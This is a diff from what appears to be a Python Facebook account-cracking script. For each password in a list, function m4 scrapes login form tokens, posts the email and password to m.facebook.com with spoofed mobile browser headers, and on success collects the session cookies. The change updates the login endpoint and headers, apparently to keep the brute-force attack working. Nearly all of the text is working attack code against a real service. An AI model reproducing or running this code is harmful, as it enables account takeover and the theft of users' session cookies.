@@ -1085,33 +1085,33 @@ def m4(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
-   log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":ps,"login":"Log In"}
-   header_freefb = {'Host': 'm.facebook.com',
-   'Connection': 'keep-alive',
-   'Content-Length': '2059',
-   'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-   'sec-ch-ua-model': '"SM-S928B"',
-   'sec-ch-ua-mobile': '?1',
-   'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-   'viewport-width': '400',
-   'Content-Type': 'application/x-www-form-urlencoded',
-   'X-FB-LSD': 'AVovWh_3iKg',
-   'sec-ch-ua-platform-version': '"14.0.0"',
-   'X-ASBD-ID': '129477',
-   'dpr': '1.8',
-   'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
-   'sec-ch-prefers-color-scheme': 'dark',
-   'sec-ch-ua-platform': '"Android"',
-   'Accept': '*/*',
-   'Origin': 'https://m.facebook.com',
-   'Sec-Fetch-Site': 'same-origin',
-   'Sec-Fetch-Mode': 'cors',
-   'Sec-Fetch-Dest': 'empty',
-   'Referer': 'https://m.facebook.com/',
-   'Accept-Encoding': 'gzip, deflate, br',
-   'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://mobile.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzIwNTM0NTY0LCJjYWxsc2l0ZV9pZCI6NDkyNDY4Nzk4MzkxMDk5fQ%3D%3D',data=log_data,headers=header_freefb).text
+   free_fb = session.get(f'https://m.facebook.com/?locale2=en_GB').text
+   log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+   header_freefb ={
+    'authority': 'm.facebook.com',
+    'accept': '*/*',
+    'accept-language': 'es-MX,es;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'dpr': '2.75',
+    'origin': 'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/?locale2=en_GB',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
+    'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23128PC33I"',
+    'sec-ch-ua-platform': 'Android',
+    'sec-ch-ua-platform-version': '"8.0.0"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.4699.170 Safari/537.36 Vivaldi/6.0.2979.18',
+    'viewport-width': '393',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVq9MsDYu_k',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
